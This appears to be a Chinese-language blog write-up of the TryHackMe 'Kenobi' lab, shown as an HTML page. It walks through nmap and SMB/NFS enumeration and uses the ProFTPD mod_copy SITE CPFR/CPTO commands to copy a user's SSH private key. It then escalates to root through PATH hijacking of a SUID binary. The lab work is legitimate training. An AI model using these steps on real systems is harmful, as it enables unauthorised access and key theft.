@@ -1,0 +1,102 @@
+<!DOCTYPE html><html lang="zh-CN" theme-mode="dark"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>[THM]  kenobi | Terminal-001 | T3yT3y</title><link rel="icon" type="image/x-icon" href="/favicon.ico"><script>var config = {"root":"/","search":{"preload":false,"activeHolder":"Enter here","blurHolder":"Search","noResult":"Data \"$0\" not found"},"code":{"codeInfo":"$0 - $1 lines","copy":"copy","copyFinish":"copied","expand":"expand"}}</script><script src="//unpkg.com/mermaid@9.2.2/dist/mermaid.min.js"></script><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lightgallery.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-zoom.css"><link type="text/css" rel="stylesheet" href="//unpkg.com/lightgallery@2.7.1/css/lg-thumbnail.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/brands.min.css"><link type="text/css" rel="stylesheet" href="/lib/fontawesome/fontawesome.min.css"><link rel="stylesheet" href="/css/arknights.css"><script>if (window.localStorage.getItem('theme-mode') === 'light') document.documentElement.setAttribute('theme-mode', 'light')
+if (window.localStorage.getItem('theme-mode') === 'dark') document.documentElement.setAttribute('theme-mode', 'dark')</script><style>@font-face {
+ font-family: BenderLight;
+ src: local('Bender'), url("/font/BenderLight.ttf");
+}
+@font-face {
+ font-family: 'JetBrains Mono';
+ src: local('JetBrains Mono'), url('/font/JetBrainsMono-Regular.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Brands';
+ src: local('Font Awesome 6 Brands'), url('/lib/fontawesome/fa-brands.woff2') format('woff2');
+}
+@font-face {
+ font-family: 'Font Awesome 6 Free';
+ src: local('Font Awesome 6 Free'), url('/lib/fontawesome/fa-regular.woff2') format('woff2');
+}</style><style>:root {
+  --dark-background: url('https://ak.hypergryph.com/assets/index/images/ak/pc/bk.jpg');
+  --light-background: url('/img/bk.jpg');
+}</style><meta name="generator" content="Hexo 6.3.0"></head><body><div class="loading" style="opacity: 0"><div class="loadingBar left"></div><div class="loadingBar right"></div></div><main><header class="closed"><nav><div class="navBtn hide"><i class="navBtnIcon"><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span><span class="navBtnIconBar"></span></i></div><div class="navItem" id="search-header"><span class="navItemTitle"><input autocomplete="off" autocorrect="off" autocapitalize="none" placeholder="Search" spellcheck="false" maxlength="50" type="text" id="search-input"></span></div><div class="navItem" id="search-holder"></div><div class="search-popup"><div id="search-result"></div></div><ol class="navContent"><li class="navItem"><a class="navBlock" href="/"><span class="navItemTitle">Home</span></a></li><li class="navItem" matchdata="categories,tags"><a class="navBlock" href="/archives/"><span class="navItemTitle">Archives</span></a></li><li class="navItem"><a class="navBlock" href="/about/"><span class="navItemTitle">About</span></a></li></ol></nav></header><article><div id="post-bg"><div id="post-title"><h1>[THM]  kenobi</h1><div id="post-info"><span>First Post: <div class="control"><time datetime="2023-05-23T12:32:52.857Z" id="date"> 2023-05-23</time></div></span><br><span>Last Update: <div class="control"><time datetime="2023-05-23T12:35:30.086Z" id="updated"> 2023-05-23</time></div></span></div></div><hr><div id="post-content"><p class='item-img' data-src='https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/173899a86771f6c70b3864a79b6351b633294154.jpg'><img src="https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/173899a86771f6c70b3864a79b6351b633294154.jpg" alt="173899a86771f6c70b3864a79b6351b633294154"></p>
+<span id="more"></span>
+
+<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ol>
+<li><p><code>nmap -sC -sV -T4 ip</code></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(root㉿kali)-[~]<br>└─<span class="hljs-comment"># nmap -sC -sV -T4 10.10.87.203</span><br>Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-10 11:36 UTC<br>Nmap scan report <span class="hljs-keyword">for</span> ip-10-10-87-203.eu-west-1.compute.internal (10.10.87.203)<br>Host is up (0.0029s latency).<br>Not shown: 993 closed tcp ports (reset)<br>PORT     STATE SERVICE     VERSION<br>21/tcp   open  ftp         ProFTPD 1.3.5<br>22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   2048 b3ad834149e95d168d3b0f057be2c0ae (RSA)<br>|   256 f8277d642997e6f865546522f7c81d8a (ECDSA)<br>|_  256 5a06edebb6567e4c01ddeabcbafa3379 (ED25519)<br>80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>| http-robots.txt: 1 disallowed entry <br>|_/admin.html<br>|_http-title: Site doesnt have a title (text/html).<br>111/tcp  open  rpcbind     2-4 (RPC <span class="hljs-comment">#100000)</span><br>| rpcinfo: <br>|   program version    port/proto  service<br>|   100000  2,3,4        111/tcp   rpcbind<br>|   100000  2,3,4        111/udp   rpcbind<br>|   100000  3,4          111/tcp6  rpcbind<br>|   100000  3,4          111/udp6  rpcbind<br>|   100003  2,3,4       2049/tcp   nfs<br>|   100003  2,3,4       2049/tcp6  nfs<br>|   100003  2,3,4       2049/udp   nfs<br>|   100003  2,3,4       2049/udp6  nfs<br>|   100005  1,2,3      39028/udp   mountd<br>|   100005  1,2,3      51006/udp6  mountd<br>|   100005  1,2,3      52219/tcp   mountd<br>|   100005  1,2,3      53459/tcp6  mountd<br>|   100021  1,3,4      34773/tcp6  nlockmgr<br>|   100021  1,3,4      37630/udp6  nlockmgr<br>|   100021  1,3,4      39473/tcp   nlockmgr<br>|   100021  1,3,4      41668/udp   nlockmgr<br>|   100227  2,3         2049/tcp   nfs_acl<br>|   100227  2,3         2049/tcp6  nfs_acl<br>|   100227  2,3         2049/udp   nfs_acl<br>|_  100227  2,3         2049/udp6  nfs_acl<br>139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)<br>445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)<br>2049/tcp open  nfs_acl     2-3 (RPC <span class="hljs-comment">#100227)</span><br>MAC Address: 02:52:93:89:63:6F (Unknown)<br>Service Info: Host: KENOBI; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel<br><br>Host script results:<br>|_clock-skew: mean: 1h39m59s, deviation: 2h53m12s, median: 0s<br>| smb2-security-mode: <br>|   311: <br>|_    Message signing enabled but not required<br>| smb-security-mode: <br>|   account_used: guest<br>|   authentication_level: user<br>|   challenge_response: supported<br>|_  message_signing: disabled (dangerous, but default)<br>| smb2-time: <br>|   <span class="hljs-built_in">date</span>: 2023-04-10T11:36:30<br>|_  start_date: N/A<br>|_nbstat: NetBIOS name: KENOBI, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 000000000000 (Xerox)<br>| smb-os-discovery: <br>|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)<br>|   Computer name: kenobi<br>|   NetBIOS computer name: KENOBI\x00<br>|   Domain name: \x00<br>|   FQDN: kenobi<br>|_  System time: 2023-04-10T06:36:30-05:00<br><br>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .<br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 12.48 seconds<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>21端口，ftp服务开放，且使用的是ProFTPD，version是1.3.5。</p>
+</li>
+<li><p>80端口开放，有网页服务器，访问网页没有任何有用信息。admin.html屁用没有（</p>
+</li>
+<li><p>111端口开放，rpc服务开启。</p>
+</li>
+<li><p>139和445端口开放，Samba服务开启。</p>
+<p class='item-img' data-src='https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/samba.png'><img src="https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/samba.png" alt="samba"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">Samba是适用于Linux和Unix的标准Windows互操作性程序套件。它允许最终用户访问和使用公司内部网或互联网上的文件、打印机和其他常见共享资源。它通常被称为网络文件系统。<br>Samba基于服务器消息块（SMB）的通用客户端/服务器协议。SMB仅针对Windows开发，如果没有Samba，其他计算机平台将与Windows机器隔离，即使它们是同一网络的一部分。<br></code></pre></td></tr></table></figure></li>
+</ul>
+</li>
+<li><p>因为上面扫描发现存在smb服务，所以使用nmap脚本<code>smb-enum-shares.nse</code>以及<code>smb-enum-users.nse</code>对靶机smb的shares以及users进行列举。</p>
+<p>​		<img src="https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/nmap-script.png" alt="nmap-script"></p>
+<p>可以发现\IPC$以及\anonymous都可以任意读写以及访问。</p>
+</li>
+<li><p>所以，我们使用<code>smbclient //ip/anonymous</code>匿名连接靶机smb共享，查看发现存在log.txt文件。（&#x2F;&#x2F;ip&#x2F;IPC$啥也没有）</p>
+<p>​	<img src="https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/information.png" alt="information"></p>
+<p>我们从log.txt中，我们可以发现用户生成了自己的ssh私钥放在<code>/home/kenobi/.ssh/</code>目录下的id_rsa文件中。于是我们考虑能否拿到该秘钥以通过ssh登录靶机。</p>
+</li>
+<li><p>于是，我们得想办法拿到秘钥。之前扫描发现的111端口开放且正在运行rpcbind服务，rpcbind是一个将远程程序调用(RPC– remote procedure call)的程序号转换为通用地址的服务器。当一个RPC 服务启动时，它会告诉 rpcbind 它正在监听的地址以及它准备启用的服务所对应的RPC程序编号。因为扫描发现nfs（network file system）服务被远程启用，我们进一步使用nmap脚本<code>nfs-ls</code>, <code>nfs-statfs</code>, <code>nfs-showmount</code>尝试枚举nfs信息。</p>
+<p class='item-img' data-src='https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/nmap-script-rpc.png'><img src="https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/nmap-script-rpc.png" alt="nmap-script-rpc"></p>
+<p>我们可以发现，靶机将&#x2F;var挂载在nfs上。我们可以尝试将这个目录挂载在我们的攻击机上。</p>
+</li>
+</ol>
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
+<li><p>但是我们想要的秘钥不在&#x2F;var目录下，我们首先要将其弄到&#x2F;var目录中。前面发现了ProFTPD的版本是1.3.5，我们<code>searchsploit proFTPD 1.3.5</code> 发现其存在文件拷贝漏洞。（其他两个’mod_copy’ RCE利用不成功）。查看File Copy的漏洞利用<code>.txt</code>文件，发现漏洞细节。</p>
+<p class='item-img' data-src='https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/exp-txt.png'><img src="https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/exp-txt.png" alt="exp-txt"></p>
+<p>该版本ProFtpd的mod_copy模块中存在漏洞。mod_copy模块实现了<code>SITE CPFR</code> 和 <code>SITE CPTO</code> 命令(类似于 RNFR 和 RNTO) ，这些命令可以用来将文件&#x2F;目录从服务器上的一个地方复制到另一个地方，而无需将数据传输到客户端并等待返回（无身份验证），该模块包含在 ProFTPD 1.3.x 的 mod_copy.c 文件中，默认情况下不进行编译。也就是说：<strong>任何未经身份验证的客户机都可以利用SITE CPFR 和 SITE CPTO 命令，将文件从FTP服务器的文件系统的任何位置复制到选定的位置。</strong>刚好是我们需要的功能。</p>
+</li>
+<li><p>我们使用nc连接ftp服务器，并利用该漏洞将id_rsa拷贝到&#x2F;var&#x2F;tmp目录下。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -nv 10.10.87.203 21<br>SITE CPFR /home/kenobi/.ssh/id_rsa<br>SITE CPTO /vat/tmp/id_rsa<br></code></pre></td></tr></table></figure>
+</li>
+<li><p>我们将&#x2F;var挂载(mount)到我们机子上</p>
+<p>​	<img src="https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/mount.png" alt="mount"></p>
+<p>可以发现，我们已经获得了ssh登录的rsa私钥。</p>
+</li>
+<li><p>我们将id_rsa文件权限改成600，否则无法用于ssh登录。</p>
+<p class='item-img' data-src='https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/ssh-login-id-rsa.png'><img src="https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/ssh-login-id-rsa.png" alt="ssh-login-id-rsa"></p>
+<p>成功登录并可以看到user.txt。</p>
+</li>
+</ol>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><ol>
+<li><p>先把lse.sh传上去再说。运行。（或者使用<code>find / -perm -u=s -type f 2&gt;/dev/null</code>查找有SUID位的二进制文件）</p>
+<p class='item-img' data-src='https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/suid.png'><img src="https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/suid.png" alt="suid"></p>
+<p>发现有趣的setuid二进制文件：&#x2F;usr&#x2F;bin&#x2F;menu。</p>
+</li>
+<li><p>我们用<code>string</code>检查一下这个二进制文件。（<code>strings </code>是 Linux 上的一个命令，它能在二进制文件上查找人类可读的字符串，我们使用以下命令来查看&#x2F;usr&#x2F;bin&#x2F;menu运行时的信息（因为执行menu命令时有文字回显，我们才使用strings命令））</p>
+<p class='item-img' data-src='https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/suid-check.png'><img src="https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/suid-check.png" alt="suid-check"></p>
+<p>我们发现，其调用<code>curl</code>,<code>uname</code>,<code>ifconfig</code>使用的不是绝对路径（<code>/usr/bin/curl</code>）这种。所以系统在执行时会从$PATH下的路径从前到后寻找这些二进制文件。</p>
+</li>
+<li><p>所以我们可以在$PATH最前面加入目录，并放入我们构造的这些二进制文件，然后menu运行时就会以root权限执行这些文件。因此我们直接构造<code>/bin/bash</code>。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment"># 在/home/kenobi目录下</span><br>kenobi@kenobi:~$ <span class="hljs-built_in">echo</span> /bin/bash &gt; ifconfig<br>kenobi@kenobi:~$ <span class="hljs-built_in">chmod</span> 777 ifconfig<br></code></pre></td></tr></table></figure>
+
+<p>​	<img src="https://markdownpicbed.oss-cn-beijing.aliyuncs.com/img/%E6%8F%90%E6%9D%83.png" alt="提权"></p>
+<p>成功提权。</p>
+</li>
+</ol>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages" style="justify-content: flex-end"><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2023/05/23/jarbas/">[vulnhub]  jarbas Prev →</a></div></div></div></div><div class="bottom-btn"><div><a id="to-top" onClick="scrolls.scrolltop();" title="To Top" style="opacity: 0; display: none;">∧</a><a id="to-index" href="#toc-div" title="To Catalog">≡</a><a id="color-mode" onClick="colorMode.change()" title="Change Theme"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">T3yT3y</a></h1><div id="description"><p>May the flame guide thee</p></div></div><div id="aside-block"><div id="toc-div"><h1>Catalog</h1><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">1.</span> <span class="toc-text">信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%8F%90%E6%9D%83"><span class="toc-number">3.</span> <span class="toc-text">提权</span></a></li></ol></div></div><footer><nobr>Published with <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> Theme <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr>by <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {code.findCode();
+document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
